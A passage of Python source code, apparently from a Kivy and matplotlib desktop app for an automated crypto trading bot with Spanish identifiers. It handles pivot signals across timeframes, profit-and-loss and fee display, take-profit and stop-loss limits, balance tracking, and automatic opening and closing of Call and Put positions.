                pivot_pred=aaaaaaaaaaaaa1
                if self.widget18.state=="down":                   
                    self.type_Pivot_reg_1=pivot_pred
                    self.Pivot_valor_1=float("{0:.5f}".format(self.utimopivot))                     
                elif self.widget19.state=="down":                    
                    self.type_Pivot_reg_2=pivot_pred
                    self.Pivot_valor_2=float("{0:.5f}".format(self.utimopivot))
                elif self.widget20.state=="down":                    
                    self.type_Pivot_reg_3=pivot_pred
                    self.Pivot_valor_3=float("{0:.5f}".format(self.utimopivot))
                elif self.widget21.state=="down":
                    self.type_Pivot_reg_4=pivot_pred
                    self.Pivot_valor_4=float("{0:.5f}".format(self.utimopivot))
                elif self.widget22.state=="down":
                    self.type_Pivot_reg_5=pivot_pred
                    self.Pivot_valor_5=float("{0:.5f}".format(self.utimopivot))
                elif self.widget23.state=="down":
                    self.type_Pivot_reg_6=pivot_pred
                    self.Pivot_valor_6=float("{0:.5f}".format(self.utimopivot))
                elif self.widget24.state=="down":
                    self.type_Pivot_reg_7=pivot_pred
                    self.Pivot_valor_7=float("{0:.5f}".format(self.utimopivot))
                elif self.widget25.state=="down":
                    self.type_Pivot_reg_8=pivot_pred
                    self.Pivot_valor_8=float("{0:.5f}".format(self.utimopivot))                
            else:
                pivot_pred=aaaaaaaaaaaaa3
                if self.widget18.state=="down":                   
                    self.type_Pivot_reg_1=pivot_pred
                    self.Pivot_valor_1=float("{0:.5f}".format(self.utimopivot))                     
                elif self.widget19.state=="down":                    
                    self.type_Pivot_reg_2=pivot_pred
                    self.Pivot_valor_2=float("{0:.5f}".format(self.utimopivot))
                elif self.widget20.state=="down":                    
                    self.type_Pivot_reg_3=pivot_pred
                    self.Pivot_valor_3=float("{0:.5f}".format(self.utimopivot))
                elif self.widget21.state=="down":
                    self.type_Pivot_reg_4=pivot_pred
                    self.Pivot_valor_4=float("{0:.5f}".format(self.utimopivot))
                elif self.widget22.state=="down":
                    self.type_Pivot_reg_5=pivot_pred
                    self.Pivot_valor_5=float("{0:.5f}".format(self.utimopivot))
                elif self.widget23.state=="down":
                    self.type_Pivot_reg_6=pivot_pred
                    self.Pivot_valor_6=float("{0:.5f}".format(self.utimopivot))
                elif self.widget24.state=="down":
                    self.type_Pivot_reg_7=pivot_pred
                    self.Pivot_valor_7=float("{0:.5f}".format(self.utimopivot))
                elif self.widget25.state=="down":
                    self.type_Pivot_reg_8=pivot_pred
                    self.Pivot_valor_8=float("{0:.5f}".format(self.utimopivot))           
            if pivot_pred==aaaaaaaaaaaaa1:
                self.direccio_pivot_principal= pivot_pred
                self.color_1.set_color("green")
                self.color_1.set_marker('^')                
            elif pivot_pred==aaaaaaaaaaaaa2:
                self.direccio_pivot_principal= pivot_pred
                self.color_1.set_color("red")
                self.color_1.set_marker('v')
            else:
                self.color_1.set_color("white")
                self.color_1.set_marker('s')
            if self.utimopivot_entrada > self.ValordeYmarcador:
                self.pivot_predx=aaaaaaaaaaaaa2                                     
            elif self.utimopivot_entrada<self.ValordeYmarcador:
                self.pivot_predx=aaaaaaaaaaaaa1              
            else:
                 self.pivot_predx="Neutral"
            if self.utimopivotE1 > self.ValordeYmarcador:
                self.pivot_predx1=aaaaaaaaaaaaa2                                     
            elif self.utimopivotE1<self.ValordeYmarcador:
                self.pivot_predx1=aaaaaaaaaaaaa1              
            else:
                 self.pivot_predx1="Neutral"                                 
            if self.pivot_predx==aaaaaaaaaaaaa1:
                self.color_3.set_color("green")
                self.color_3.set_marker('^')                
            elif self.pivot_predx==aaaaaaaaaaaaa2:
                self.color_3.set_color("red")
                self.color_3.set_marker('v')
            else:
                self.color_3.set_color("white")
                self.color_3.set_marker('s')            
            if self.pivot_predx1==aaaaaaaaaaaaa1:
                self.color_3YY.set_color("green")
                self.color_3YY.set_marker('^')                
            elif self.pivot_predx1==aaaaaaaaaaaaa2:
                self.color_3YY.set_color("red")
                self.color_3YY.set_marker('v')
            else:
                self.color_3YY.set_color("white")
                self.color_3YY.set_marker('s')   
            if self.continuidadtendencia1==aaaaaaaaaaaaa1:
                self.color_2.set_color("green")
                self.color_2.set_marker('^')                                     
            elif self.continuidadtendencia1==aaaaaaaaaaaaa2:
                self.color_2.set_color("red")
                self.color_2.set_marker('v')
            else:
                 self.color_2.set_color("white")
                 self.color_2.set_marker('s')
            if self.widget18.state=="down":                   
                self.type_vela_1=self.continuidadtendencia1
                self.posible_pi_1= self.pivot_predx
                self.Activo_run_1= self.graficaSSS
                self.pospivot1 = self.utimopivot_entrada
            elif self.widget19.state=="down":                    
                self.type_vela_2=self.continuidadtendencia1
                self.posible_pi_2= self.pivot_predx
                self.Activo_run_2= self.graficaSSS
                self.pospivot2 = self.utimopivot_entrada
            elif self.widget20.state=="down":                    
                self.type_vela_3=self.continuidadtendencia1
                self.posible_pi_3= self.pivot_predx
                self.Activo_run_3= self.graficaSSS
                self.pospivot3 = self.utimopivot_entrada
            elif self.widget21.state=="down":
                self.type_vela_4=self.continuidadtendencia1
                self.posible_pi_4= self.pivot_predx
                self.Activo_run_4= self.graficaSSS
                self.pospivot4 = self.utimopivot_entrada
            elif self.widget22.state=="down":
                self.type_vela_5=self.continuidadtendencia1
                self.posible_pi_5= self.pivot_predx
                self.Activo_run_5= self.graficaSSS
                self.pospivot5 = self.utimopivot_entrada
            elif self.widget23.state=="down":
                self.type_vela_6=self.continuidadtendencia1
                self.posible_pi_6= self.pivot_predx
                self.Activo_run_6= self.graficaSSS
                self.pospivot6 = self.utimopivot_entrada
            elif self.widget24.state=="down":
                self.type_vela_7=self.continuidadtendencia1
                self.posible_pi_7= self.pivot_predx
                self.Activo_run_7= self.graficaSSS
                self.pospivot7 = self.utimopivot_entrada
            elif self.widget25.state=="down":
                self.type_vela_8=self.continuidadtendencia1
                self.posible_pi_8= self.pivot_predx
                self.Activo_run_8= self.graficaSSS
                self.pospivot8 = self.utimopivot_entrada
            if self.widget18.state=="down":
                if self.contol_precio>self.contol_precio111:
                    a=self.contol_precio
                    b=self.contol_precio111
                else:
                    a=self.contol_precio111
                    b=self.contol_precio                   
                self.margen_call_1=a
                self.margen_put_1=b                
            elif self.widget19.state=="down":
                if self.contol_precio>self.contol_precio111:
                    a=self.contol_precio
                    b=self.contol_precio111
                else:
                    a=self.contol_precio111
                    b=self.contol_precio                    
                self.margen_call_2=a
                self.margen_put_2=b
            elif self.widget20.state=="down":
                if self.contol_precio>self.contol_precio111:
                    a=self.contol_precio
                    b=self.contol_precio111
                else:
                    a=self.contol_precio111
                    b=self.contol_precio                    
                self.margen_call_3=a
                self.margen_put_3=b
            elif self.widget21.state=="down":
                if self.contol_precio>self.contol_precio111:
                    a=self.contol_precio
                    b=self.contol_precio111
                else:
                    a=self.contol_precio111
                    b=self.contol_precio
                self.margen_call_4=a
                self.margen_put_4=b
            elif self.widget22.state=="down":
                if self.contol_precio>self.contol_precio111:
                    a=self.contol_precio
                    b=self.contol_precio111
                else:
                    a=self.contol_precio111
                    b=self.contol_precio
                self.margen_call_5=a
                self.margen_put_5=b
            elif self.widget23.state=="down":
                if self.contol_precio>self.contol_precio111:
                    a=self.contol_precio
                    b=self.contol_precio111
                else:
                    a=self.contol_precio111
                    b=self.contol_precio
                self.margen_call_6=a
                self.margen_put_6=b
            elif self.widget24.state=="down":
                if self.contol_precio>self.contol_precio111:
                    a=self.contol_precio
                    b=self.contol_precio111
                else:
                    a=self.contol_precio111
                    b=self.contol_precio
                self.margen_call_7=a
                self.margen_put_7=b
            elif self.widget25.state=="down":
                if self.contol_precio>self.contol_precio111:
                    a=self.contol_precio
                    b=self.contol_precio111
                else:
                    a=self.contol_precio111
                    b=self.contol_precio
                self.margen_call_8=a
                self.margen_put_8=b                       
            self.skfkjsdkfjs1= f"Overview in 1min ({self.Activo_run_1})\nPut: {self.margen_call_1}\nCall: {self.margen_put_1}"
            self.skfkjsdkfjs2= f"Overview in 5min ({self.Activo_run_2})\nPut: {self.margen_call_2}\nCall: {self.margen_put_2}"
            self.skfkjsdkfjs3= f"Overview in 15min ({self.Activo_run_3})\nPut: {self.margen_call_3}\nCall: {self.margen_put_3}"
            self.skfkjsdkfjs4= f"Overview in 30min ({self.Activo_run_4})\nPut: {self.margen_call_4}\nCall: {self.margen_put_4}"
            self.skfkjsdkfjs5= f"Overview in 1hour ({self.Activo_run_5})\nPut: {self.margen_call_5}\nCall: {self.margen_put_5}"
            self.skfkjsdkfjs6= f"Overview in 4hour ({self.Activo_run_6})\nPut: {self.margen_call_6}\nCall: {self.margen_put_6}"
            self.skfkjsdkfjs7= f"Overview in 1day ({self.Activo_run_7})\nPut: {self.margen_call_7}\nCall: {self.margen_put_7}"
            self.skfkjsdkfjs8= f"Overview in 1week ({self.Activo_run_8})\nPut: {self.margen_call_8}\nCall: {self.margen_put_8}"
            self.widget999991.text=self.skfkjsdkfjs1
            self.widget999992.text=self.skfkjsdkfjs2
            self.widget999993.text=self.skfkjsdkfjs3
            self.widget999994.text=self.skfkjsdkfjs4
            self.widget999995.text=self.skfkjsdkfjs5
            self.widget999996.text=self.skfkjsdkfjs6
            self.widget999997.text=self.skfkjsdkfjs7
            self.widget999998.text=self.skfkjsdkfjs8
            self.pivot_pincipal=pivot_pred
            self.ax.legend([self.color_1,self.color_3,self.color_3YY,self.color_2],[f"Pivot(F3): {pivot_pred}",f"Pivot(F2): {self.pivot_predx}",f"Pivot(F1): {self.pivot_predx1}",f"Trend: {self.continuidadtendencia1}"],edgecolor="black",loc ='lower center', labelcolor="white" ,ncol=4, fontsize=7,labelspacing=0.1,facecolor="k")            
            self.figz.canvas.draw_idle()
        except:
            None           
    #--------------------------------------------------------------------------------------------------------------------------------------------------------------------------                
    def Detener_operaciones(self, instance):
        try:
            if hasattr(self, 'ejecutor_registro_beneficio_call_put'):
                Clock.unschedule(self.ejecutor_registro_beneficio_call_put)
                self.ejecutor_registro_beneficio_call_put=0
            else:
                None
        except:
            None 
        try:
            if hasattr(self, 'actualizador_take_stop_call'):
                Clock.unschedule(self.actualizador_take_stop_call)
                self.actualizador_take_stop_call=0
            else:
                None
        except:
            None        
        try:        
            self.compra_call_line.remove()
            self.compra_call_entrada.remove()
            self.Inversionttt=0
            self.Precio_entradattt=0
            self.Direccion_entradattt=0
            self.Apalancamiento_entradattt=0
            del self.compra_call_line
            del self.compra_call_entrada            
            self.call_conador_operacion=0
        except:
            None
        try:        
            self.compra_call_linep.remove()
            self.compra_call_entradap.remove()
            self.Inversiontttp=0
            self.Precio_entradatttp=0
            self.Direccion_entradatttp=0
            self.Apalancamiento_entradatttp=0
            del self.compra_call_line
            del self.compra_call_entrada            
            self.call_conador_operacionp=0
        except:
            None        
        try:
            self.compra_call_line_take.remove()
            self.compra_call_entrada_take.remove()
            del self.compra_call_line_take
            del self.compra_call_entrada_take
        except:
           None
        try:
            self.compra_call_line_stop.remove()
            self.compra_call_entrada_stop.remove()
            del self.compra_call_line_stop
            del self.compra_call_entrada_stop
        except:
           None       
        self.call_conador_operacion=0
        self.call_conador_operacionp=0
        self.limite_stop="a"
        self.limite_take="a"       
        self.spinner_22.text=""
        self.spinner_22.hint_text="Value"
        self.spinner_23.text=""
        self.spinner_23.hint_text="Value"                    
        self.widget15_1.text="Call\n(0)"
        self.widget15_2.text="Put\n(0)"
        self.perdida_fee_1=0
        self.perdida_fee_2=0                        
        self.cambio_us1=0
        self.cambio_us2=0
        self.cambio_us3=0
        self.cambio_us4=0
        self.optimizar_calculo_beneficio=0
        Clock.schedule_once(self.Cerrar_operaciones_COINEX)                       
        self.figz.canvas.draw_idle()
    #--------------------------------------------------------------------------------------------------------------------------------------------------------------------------              
    def actualizar_beneficio_operacion(self, dt):       
        Clock.schedule_once(self.parpadear_boton)          
        try:
            pnl=int(self.Inversionttt)*int(self.Apalancamiento_entradattt)*self.conseguir_precio_en_tiempo_real/float(self.Precio_entradattt)-int(self.Inversionttt)*int(self.Apalancamiento_entradattt)
            self.perdida_fee_1 = float("{0:.2f}".format(int(self.Inversionttt)*int(self.Apalancamiento_entradattt)*float(self.spinner_20auto.text))) 
            self.pnl_decimal=float("{0:.2f}".format(pnl-self.perdida_fee_1))                                
            datos_entrada_call=f"Inv: {self.Inversionttt} USD\nEnt: {self.Precio_entradattt}\nOpt: {self.Direccion_entradattt}\nLev: {self.Apalancamiento_entradattt}x\nPnL: {self.pnl_decimal} USD\nFee: {self.perdida_fee_1}"
            self.compra_call_entrada.set_text(datos_entrada_call)
            self.compra_call_line.set_ydata([self.Precio_entradattt])            
            Clock.schedule_once(self.registrar_movimiento_capital)         
            self.figz.canvas.draw_idle()
        except:
           None
        try:
            pnl_put=(int(self.Inversiontttp)*int(self.Apalancamiento_entradatttp)*self.conseguir_precio_en_tiempo_real/float(self.Precio_entradatttp)-int(self.Inversiontttp)*int(self.Apalancamiento_entradatttp))*(-1)           
            self.perdida_fee_2 = float("{0:.2f}".format(int(self.Inversiontttp)*int(self.Apalancamiento_entradatttp)*float(self.spinner_20auto.text))) 
            self.pnl_decimal_put=float("{0:.2f}".format(pnl_put-self.perdida_fee_2))           
            datos_entrada_put=f"Inv: {self.Inversiontttp} USD\nEnt: {self.Precio_entradatttp}\nOpt: {self.Direccion_entradatttp}\nLev: {self.Apalancamiento_entradatttp}x\nPnL: {self.pnl_decimal_put} USD\nFee: {self.perdida_fee_2}"
            self.compra_call_entradap.set_text(datos_entrada_put)
            self.compra_call_linep.set_ydata([self.Precio_entradatttp])            
            Clock.schedule_once(self.registrar_movimiento_capital)
            self.figz.canvas.draw_idle()
        except:
            None          
    #--------------------------------------------------------------------------------------------------------------------------------------------------------------------------                          
    def registrar_movimiento_capital(self, dt):
        if self.call_conador_operacion==1:
            balance_capital = self.saldo_inicial+self.pnl_decimal           
        else:
            balance_capital = self.saldo_inicial+self.pnl_decimal_put
        if self.registro_saldo[-1]!=float(balance_capital):             
            self.registro_saldo.append(float(balance_capital))
            nuevo_valor=balance_capital
            self.modificar_valor(nuevo_valor)
            indice_saldo_x = range(len(self.registro_saldo))
            self.binaria.set_data(indice_saldo_x, self.registro_saldo)
            max_de_capital=float("{0:.2f}".format(max(self.registro_saldo)))
            min_de_capital=float("{0:.2f}".format(min(self.registro_saldo)))
            self.capital_maximo.set_ydata([max_de_capital])            
            self.capital_minimo.set_ydata([min_de_capital])
            #sjdkdj=len(self.registro_saldo)            
            #self.ax25.set_xlim(0,sjdkdj)            
            #margin = 0.4 * (max(self.registro_saldo) - min(self.registro_saldo))
            #self.ax25.set_ylim(min(self.registro_saldo) - margin, max(self.registro_saldo) + margin*self.escly)
            #axadsdsd=float("{0:.2f}".format(self.registro_saldo[-1]))            
            #self.ax25.legend([self.binaria,self.capital_maximo,self.capital_minimo],[f"Cap: {axadsdsd} USD",f"Max: {max_de_capital} USD",f"Min: {min_de_capital} USD"],edgecolor="black",loc ='upper center', labelcolor="white" ,ncol=5, fontsize=6,labelspacing=0.1,facecolor="k",bbox_to_anchor=(0.5, self.niv_pos))                       
            self.figz.canvas.draw_idle()
        else:
            None        
        Clock.schedule_once(self.Condiciones_de_detenciones_de_operaciones)           
    #--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    def actualizar_limite_take_profit_para_call(self, dt):
        if self.call_conador_operacion==1:
            try:
                take_rev=float(self.spinner_22.text)
                if self.Precio_entradattt < take_rev:
                    if self.limite_take==take_rev and self.cambio_us1==0:
                        variable_regulacion_take_actividad1 = (self.promedio_V-1)*self.variable_act_take                                               
                        limite_take_precio = self.Precio_entradattt+(variable_regulacion_take_actividad1/int(self.Apalancamiento_entradattt))*self.Precio_entradattt            
                        self.limite_take=float("{0:.5f}".format(limite_take_precio))
                        self.spinner_22.text=f"{self.limite_take}"
                    else:
                        self.cambio_us1=1
                        self.limite_take=float("{0:.5f}".format(take_rev))
                    pnl_take=int(self.Inversionttt)*int(self.Apalancamiento_entradattt)*self.limite_take/float(self.Precio_entradattt)-int(self.Inversionttt)*int(self.Apalancamiento_entradattt)
                    pnl_take_control_decimal=float("{0:.2f}".format(pnl_take))
                    datos_entrada_take1=f"TP: {self.limite_take}\nP: {pnl_take_control_decimal} USD"                    
                    self.compra_call_entrada_take.set_position((self.terminacionejexxx-self.deplx,self.limite_take))
                    self.compra_call_entrada_take.set_text(datos_entrada_take1)
                    self.compra_call_line_take.set_ydata([self.limite_take])
                else:
                    None                    
            except:
                None
            try:
                stop_rev=float(self.spinner_23.text)
                if self.Precio_entradattt > stop_rev:
                    if self.limite_stop==stop_rev and self.cambio_us2==0:
                        variable_regulacion_take_actividad2 = (self.promedio_V-1)*self.variable_act_stop                                               
                        limite_take_precio_stop = self.Precio_entradattt-(variable_regulacion_take_actividad2/int(self.Apalancamiento_entradattt))*self.Precio_entradattt            
                        self.limite_stop=float("{0:.5f}".format(limite_take_precio_stop))
                        self.spinner_23.text=f"{self.limite_stop}"
                    else:
                        self.cambio_us2=1
                        self.limite_stop=float("{0:.5f}".format(stop_rev))
                    pnl_stop=(int(self.Inversionttt)*int(self.Apalancamiento_entradattt)*self.limite_stop/float(self.Precio_entradattt)-int(self.Inversionttt)*int(self.Apalancamiento_entradattt))
                    pnl_stop_control_decimal=float("{0:.2f}".format(pnl_stop))                    
                    datos_entrada_take2=f"SL: {stop_rev}\nL: {pnl_stop_control_decimal} USD"
                    self.compra_call_entrada_stop.set_position((self.terminacionejexxx-self.deplx,self.limite_stop))
                    self.compra_call_entrada_stop.set_text(datos_entrada_take2)
                    self.compra_call_line_stop.set_ydata([self.limite_stop])
                else:
                    None
            except:
                None
    #--------------------------------------------------------------------------------------------------------------------------------------------------------------------------                                
    def actualizar_limite_take_profit_para_put(self, dt):
        if self.call_conador_operacionp==1:
            try:
                take_rev=float(self.spinner_22.text)
                if self.Precio_entradatttp > take_rev:
                    if self.limite_take==take_rev and self.cambio_us3==0:
                        variable_regulacion_take_actividad1 = (self.promedio_V-1)*self.variable_act_take                                               
                        limite_take_precio = self.Precio_entradatttp-(variable_regulacion_take_actividad1/int(self.Apalancamiento_entradatttp))*self.Precio_entradatttp            
                        self.limite_take=float("{0:.5f}".format(limite_take_precio))
                        self.spinner_22.text=f"{self.limite_take}"
                    else:
                        self.cambio_us3=1
                        self.limite_take=float("{0:.5f}".format(take_rev))                   
                    pnl_take=(int(self.Inversiontttp)*int(self.Apalancamiento_entradatttp)*self.limite_take/float(self.Precio_entradatttp)-int(self.Inversiontttp)*int(self.Apalancamiento_entradatttp))*(-1)
                    pnl_take_control_decimal=float("{0:.2f}".format(pnl_take))
                    datos_entrada_take3=f"TP: {self.limite_take}\nP: {pnl_take_control_decimal} USD"                                        
                    self.compra_call_entrada_take.set_position((self.terminacionejexxx-self.deplx,self.limite_take))
                    self.compra_call_entrada_take.set_text(datos_entrada_take3)
                    self.compra_call_line_take.set_ydata([self.limite_take])
                else:
                    None                    
            except:
                None
            try:
                stop_rev=float(self.spinner_23.text)
                if self.Precio_entradatttp < stop_rev:
                    if self.limite_stop==stop_rev and self.cambio_us4==0:
                        variable_regulacion_take_actividad2 = (self.promedio_V-1)*self.variable_act_stop                                               
                        limite_take_precio_stop = self.Precio_entradatttp+(variable_regulacion_take_actividad2/int(self.Apalancamiento_entradatttp))*self.Precio_entradatttp            
                        self.limite_stop=float("{0:.5f}".format(limite_take_precio_stop))
                        self.spinner_23.text=f"{self.limite_stop}"
                    else:
                        self.cambio_us4=1
                        self.limite_stop=float("{0:.5f}".format(stop_rev))
                    pnl_stop=(int(self.Inversiontttp)*int(self.Apalancamiento_entradatttp)*self.limite_stop/float(self.Precio_entradatttp)-int(self.Inversiontttp)*int(self.Apalancamiento_entradatttp))*(-1)
                    pnl_stop_control_decimal=float("{0:.2f}".format(pnl_stop))                    
                    datos_entrada_take4=f"SL: {stop_rev}\nL: {pnl_stop_control_decimal} USD"
                    self.compra_call_entrada_stop.set_position((self.terminacionejexxx-self.deplx,self.limite_stop))
                    self.compra_call_entrada_stop.set_text(datos_entrada_take4)
                    self.compra_call_line_stop.set_ydata([self.limite_stop])
                else:
                    None
            except:
                None                           
    #---------------------------------------------------------------------------------------------------------------------------------------------------------------------
    def parpadear_boton(self, dt):        
        if self.comprobar_iniciar==1:                  
            if all(isclose(a, b, rel_tol=1e-9) for a, b in zip(self.widget15_2333.background_color, (14/255, 173/255, 152/255))):
                if self.pivot_predx1=="Call":
                    jdjdj="green"
                elif self.pivot_predx1=="Put":
                    jdjdj="red"
                else:
                    jdjdj="gray"
                self.widget15_2333.background_color=jdjdj                
            else:
                self.widget15_2333.background_color=color_botones
        else:
            None
    #----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------             
    def Condiciones_de_detenciones_de_operaciones(self, dt):                 
        #------------------------------------------------------------------------------------Condicion de cerrar en operaciones automaticas--------------------------------------------------------------------------------
        if self.operau == 1:
            #------------------------------------------------------------------------------------Condicion de cerrar con beneficio en operaciones automaticas de COMPRA----------------------------------------------------
            if self.call_conador_operacion==1:
                try:                   
                    if self.conseguir_precio_en_tiempo_real >= self.limite_take and self.continuidadtendencia1 !="Call" and self.continuidadtendencia1 !="Neutral":                        
                        self.rev_cierre_por_stop_loss=1                    
                        try:
                            if hasattr(self, 'ejecutor_registro_beneficio_call_put'):
                                Clock.unschedule(self.ejecutor_registro_beneficio_call_put)
                                self.ejecutor_registro_beneficio_call_put=0
                            else:
                                None
                        except:
                            None 
                        try:
                            if hasattr(self, 'actualizador_take_stop_call'):
                                Clock.unschedule(self.actualizador_take_stop_call)
                                self.actualizador_take_stop_call=0
                            else:
                                None
                        except:
                            None                    
                        self.call_conador_operacion=0
                        self.call_conador_operacionp=0
                        self.widget15_2333.background_color=color_botones
                                                   
                        self.widget15_2333xxx.trigger_action()
                    else:
                        None                                     
                except:
                    None
                #------------------------------------------------------------------------------------Condicion de cerrar con perdida en operaciones automaticas de COMPRA---------------------------------------------------
                try:
                    if self.conseguir_precio_en_tiempo_real <= self.limite_stop:                    
                        self.rev_cierre_por_stop_loss=1                    
                        try:
                            if hasattr(self, 'ejecutor_registro_beneficio_call_put'):
                                Clock.unschedule(self.ejecutor_registro_beneficio_call_put)
                                self.ejecutor_registro_beneficio_call_put=0
                            else:
                                None
                        except:
                            None 
                        try:
                            if hasattr(self, 'actualizador_take_stop_call'):
                                Clock.unschedule(self.actualizador_take_stop_call)
                                self.actualizador_take_stop_call=0
                            else:
                                None
                        except:
                            None
                        self.call_conador_operacion=0
                        self.call_conador_operacionp=0
                        self.widget15_2333.background_color=color_botones                                     
                        self.widget15_2333xxx.trigger_action()
                    else:
                        None 
                except:
                    None
            #------------------------------------------------------------------------------------Condicion de cerrar con beneficio en operaciones automaticas de VENTA------------------------------------------------------
            elif self.call_conador_operacionp==1:
                try:                   
                    if self.conseguir_precio_en_tiempo_real <= self.limite_take and self.continuidadtendencia1 !="Put" and self.continuidadtendencia1 !="Neutral":                    
                        self.rev_cierre_por_stop_loss=1
                        try:
                            if hasattr(self, 'ejecutor_registro_beneficio_call_put'):
                                Clock.unschedule(self.ejecutor_registro_beneficio_call_put)
                                self.ejecutor_registro_beneficio_call_put=0 
                        except:
                            None 
                        try:
                            if hasattr(self, 'actualizador_take_stop_call'):
                                Clock.unschedule(self.actualizador_take_stop_call)
                                self.actualizador_take_stop_call=0
                        except:
                            None
                        self.call_conador_operacion=0
                        self.call_conador_operacionp=0
                        self.widget15_2333.background_color=color_botones
                        self.detector_zona_problematica=0                                          
                        self.widget15_2333xxx.trigger_action()
                    else:
                        None 
                except:
                    None
                #------------------------------------------------------------------------------------Condicion de cerrar con perdida en operaciones automaticas de VENTA----------------------------------------------------
                try:
                    if self.conseguir_precio_en_tiempo_real >= self.limite_stop:                   
                        self.rev_cierre_por_stop_loss=1                        
                        try:
                            if hasattr(self, 'ejecutor_registro_beneficio_call_put'):
                                Clock.unschedule(self.ejecutor_registro_beneficio_call_put)
                                self.ejecutor_registro_beneficio_call_put=0
                            else:
                                None 
                        except:
                            None 
                        try:
                            if hasattr(self, 'actualizador_take_stop_call'):
                                Clock.unschedule(self.actualizador_take_stop_call)
                                self.actualizador_take_stop_call=0
                            else:
                                None
                        except:
                            None
                        self.call_conador_operacion=0
                        self.call_conador_operacionp=0
                        self.widget15_2333.background_color=color_botones
                        self.widget15_2333xxx.trigger_action()
                    else:
                        None
                except:
                    None
        #------------------------------------------------------------------------------------Condicion de cerrar en operaciones manuales de COMPRA---------------------------------------------------------------------------
        else:
            if self.call_conador_operacion==1:
                #------------------------------------------------------------------------------------Condicion de cerrar en operaciones manuales de COMPRA alcanzado la toma de beneficio------------------------------------
                try:
                    if self.conseguir_precio_en_tiempo_real >= self.limite_take:                    
                        self.rev_cierre_por_stop_loss=1                    
                        try:
                            if hasattr(self, 'ejecutor_registro_beneficio_call_put'):
                                Clock.unschedule(self.ejecutor_registro_beneficio_call_put)
                                self.ejecutor_registro_beneficio_call_put=0
                            else:
                                None
                        except:
                            None 
                        try:
                            if hasattr(self, 'actualizador_take_stop_call'):
                                Clock.unschedule(self.actualizador_take_stop_call)
                                self.actualizador_take_stop_call=0
                            else:
                                None
                        except:
                            None                    
                        self.call_conador_operacion=0
                        self.call_conador_operacionp=0
                        self.widget15_2333.background_color=color_botones
                        self.detector_zona_problematica=0                                     
                        self.widget15_2333xxx.trigger_action()
                    else:
                        None                                     
                except:
                    None
                #------------------------------------------------------------------------------------Condicion de cerrar en operaciones manuales de COMPRA alcanzado el limite de perdida-----------------------------------
                try:
                    if self.conseguir_precio_en_tiempo_real <= self.limite_stop:                    
                        self.rev_cierre_por_stop_loss=1                                         
                        try:
                            if hasattr(self, 'ejecutor_registro_beneficio_call_put'):
                                Clock.unschedule(self.ejecutor_registro_beneficio_call_put)
                                self.ejecutor_registro_beneficio_call_put=0
                            else:
                                None
                        except:
                            None 
                        try:
                            if hasattr(self, 'actualizador_take_stop_call'):
                                Clock.unschedule(self.actualizador_take_stop_call)
                                self.actualizador_take_stop_call=0
                            else:
                                None
                        except:
                            None
                        self.call_conador_operacion=0
                        self.call_conador_operacionp=0
                        self.widget15_2333.background_color=color_botones                                     
                        self.widget15_2333xxx.trigger_action()
                    else:
                        None 
                except:
                    None
            elif self.call_conador_operacionp==1:
                #------------------------------------------------------------------------------------Condicion de cerrar en operaciones manuales de VENTA alcanzado la toma de beneficio-----------------------------------
                try:
                    if self.conseguir_precio_en_tiempo_real <= self.limite_take:                    
                        self.rev_cierre_por_stop_loss=1
                        try:
                            if hasattr(self, 'ejecutor_registro_beneficio_call_put'):
                                Clock.unschedule(self.ejecutor_registro_beneficio_call_put)
                                self.ejecutor_registro_beneficio_call_put=0 
                        except:
                            None 
                        try:
                            if hasattr(self, 'actualizador_take_stop_call'):
                                Clock.unschedule(self.actualizador_take_stop_call)
                                self.actualizador_take_stop_call=0
                        except:
                            None
                        self.call_conador_operacion=0
                        self.call_conador_operacionp=0
                        self.widget15_2333.background_color=color_botones
                        self.detector_zona_problematica=0                                          
                        self.widget15_2333xxx.trigger_action()
                    else:
                        None 
                except:
                    None
                #------------------------------------------------------------------------------------Condicion de cerrar en operaciones manuales de VENTA alcanzado el limite de perdida-----------------------------------
                try:
                    if self.conseguir_precio_en_tiempo_real >= self.limite_stop:                   
                        self.rev_cierre_por_stop_loss=1                       
                        try:
                            if hasattr(self, 'ejecutor_registro_beneficio_call_put'):
                                Clock.unschedule(self.ejecutor_registro_beneficio_call_put)
                                self.ejecutor_registro_beneficio_call_put=0
                            else:
                                None 
                        except:
                            None 
                        try:
                            if hasattr(self, 'actualizador_take_stop_call'):
                                Clock.unschedule(self.actualizador_take_stop_call)
                                self.actualizador_take_stop_call=0
                            else:
                                None
                        except:
                            None
                        self.call_conador_operacion=0
                        self.call_conador_operacionp=0
                        self.widget15_2333.background_color=color_botones
                        self.widget15_2333xxx.trigger_action()
                    else:
                        None
                except:
                    None
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------                  
    def AUTO_DINAMICA_OPERACION(self, dt):                 
        if self.call_conador_operacion==0 and self.call_conador_operacionp==0:
            if self.rev_cierre_por_stop_loss==1 :
                self.widget15_2333.text='Robot\n(WAIT)'
                self.rev_wait=1
                if self.utimopivotE1>self.ValordeYmarcador:
                    self.direccion_arriba_abajo_sombra="abajo"                                      
                elif self.utimopivotE1<self.ValordeYmarcador:
                    self.direccion_arriba_abajo_sombra="arriba"               
                else:
                     None
                if self.detector_zona_problematica==0:
                    # condicion para iniciar otra operacion---------------------------------------------------------------ojo-------------------
                    if self.continuidadtendencia1 == self.pivot_predx1==self.pivot_predx==self.pivot_pincipal and self.continuidadtendencia1 != "Neutral":                                               
                        self.rev_cierre_por_stop_loss=0                   
                        self.widget15_2333.text='Robot\n(ON)'
                    else:
                        None
                else:
                    try:                                                                            
                        self.rev_cierre_por_stop_loss=0
                        self.detector_zona_problematica=0
                        self.widget15_2333.text='Robot\n(ON)'                                 
                    except:
                        None                     
            else:               
                if self.utimopivotE1>self.ValordeYmarcador:
                    self.rev_wait=0
                    self.direccion_arriba_abajo="abajo"
                    self.precio_referencia_pivot=self.utimopivotE1
                    self.widget15_2.trigger_action()
                    self.widget15_2.text="Put\n(1)"                     
                elif self.utimopivotE1<self.ValordeYmarcador:
                    self.rev_wait=0
                    self.precio_referencia_pivot=self.utimopivotE1
                    self.direccion_arriba_abajo="arriba"
                    self.widget15_1.trigger_action()
                    self.widget15_1.text="Call\n(1)"
                else:
                     None             
        else:
            None                      
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    def AUTO_3(self, dt):        
        self.widget15_2333.text='Robot\n(ON)'                                            
        self.AUTO_OPERACION= Clock.schedule_interval(self.AUTO_DINAMICA_OPERACION, 0.5)
        self.operau = 1 
#------------------------------------------------------------------------------------------------------------------------------          
    def AUTO_2(self, dt):
